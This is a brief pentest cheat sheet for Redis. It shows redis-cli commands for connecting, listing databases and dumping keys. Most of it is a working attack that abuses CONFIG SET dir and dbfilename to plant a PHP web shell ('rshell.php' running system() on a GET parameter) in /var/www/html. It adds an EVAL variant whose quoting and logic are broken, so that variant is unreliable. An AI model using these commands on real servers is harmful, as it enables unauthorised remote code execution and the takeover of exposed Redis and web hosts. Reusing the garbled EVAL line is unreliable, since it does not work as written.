# Redis

Connect to redis server

```sh
redis-cli -h <host> -p <port>
```

To see how many databases are configured:

```sh
CONFIG GET databases
```

To see which databases contain data:

```sh
INFO keyspace
```

View the content

```sh
KEYS *
```

Write a PHP script to a web server file.

```sh
CONFIG SET dir /var/www/html
CONFIG SET dbfilename rshell.php
SET dummy "<?php system($_GET['cmd']); ?>"
save
```

OU

```sh
EVAL "return redis.call('set', '/var/www/html/test.php', '<?php exec('bash code') ?>')" 0
```